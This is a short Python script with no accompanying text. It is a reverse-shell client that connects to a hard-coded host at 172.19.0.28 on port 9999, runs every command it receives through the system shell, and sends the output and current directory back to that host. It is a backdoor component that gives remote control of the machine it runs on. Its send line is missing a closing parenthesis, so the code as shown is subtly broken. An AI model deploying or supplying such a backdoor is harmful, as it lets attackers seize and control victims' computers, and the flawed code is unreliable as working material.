
import socket
import os
import subprocess

S = socket.socket()
HOST = '172.19.0.28'
PORT = 9999

S.connect((HOST, PORT))

while True:
    data = S.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        currentWD = os.getcwd() + ">"
        S.send(str.encode(output_str + currentWD, 'utf-8')
        print(output_str)
